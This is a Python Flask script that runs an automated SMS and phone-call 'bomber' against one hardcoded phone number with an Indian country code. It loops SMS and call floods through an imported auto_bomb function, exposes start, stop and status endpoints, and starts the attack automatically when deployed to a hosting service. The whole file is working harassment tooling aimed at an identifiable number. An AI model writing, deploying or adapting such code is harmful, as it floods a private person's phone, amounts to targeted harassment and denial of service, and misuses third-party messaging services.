#!/usr/bin/python
import os, sys, json, time, threading
from flask import Flask, request, jsonify
from utils.decorators import MessageDecorator
from auto_bomber import auto_bomb

app = Flask(__name__)
bomb_thread = None
bomb_running = False
stop_flag = False
mesgdcrt = MessageDecorator("icon")

CC = "91"
TARGET = "7880393113"
SMS_LIMIT = int(os.environ.get("SMS_LIMIT", 500))
CALL_LIMIT = int(os.environ.get("CALL_LIMIT", 15))
DELAY = int(os.environ.get("BOMB_DELAY", 1))
THREADS = int(os.environ.get("BOMB_THREADS", 3))
LOOP_WAIT = int(os.environ.get("LOOP_WAIT", 10))

def run_bomber():
    global bomb_running, stop_flag
    bomb_running = True
    stop_flag = False
    cycle = 0

    try:
        while not stop_flag:
            cycle += 1
            mesgdcrt.SectionMessage(f"CYCLE #{cycle} STARTING")

            if not stop_flag:
                try:
                    auto_bomb(CC, TARGET, "sms", SMS_LIMIT, DELAY, THREADS, loop=False)
                except BaseException as e:
                    mesgdcrt.FailureMessage(f"SMS error: {e}")
                    time.sleep(5)

            if not stop_flag:
                try:
                    auto_bomb(CC, TARGET, "call", CALL_LIMIT, DELAY, THREADS, loop=False)
                except BaseException as e:
                    mesgdcrt.FailureMessage(f"CALL error: {e}")
                    time.sleep(5)

            if not stop_flag:
                mesgdcrt.SuccessMessage(f"CYCLE #{cycle} COMPLETE")
                mesgdcrt.WarningMessage(f"Next cycle in {LOOP_WAIT}s...")
                time.sleep(LOOP_WAIT)
    except BaseException as e:
        mesgdcrt.FailureMessage(f"Fatal error: {e}")
    finally:
        bomb_running = False

@app.route("/")
def home():
    return jsonify({
        "status": "running" if bomb_running else "idle",
        "target": f"+{CC} {TARGET}",
        "cycle": {"sms": SMS_LIMIT, "call": CALL_LIMIT, "delay": DELAY, "threads": THREADS}
    })

@app.route("/start", methods=["POST"])
def start():
    global bomb_thread
    if bomb_running:
        return jsonify({"error": "Already running"}), 400
    t = threading.Thread(target=run_bomber, daemon=True)
    t.start()
    bomb_thread = t
    return jsonify({"message": "Bombing started"})

@app.route("/stop", methods=["POST"])
def stop():
    global bomb_running, stop_flag
    stop_flag = True
    bomb_running = False
    return jsonify({"message": "Stopping..."})

@app.route("/status")
def status():
    return jsonify({"running": bomb_running, "target": f"+{CC} {TARGET}"})

# Auto-start on boot (works with gunicorn on Render)
threading.Thread(target=run_bomber, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
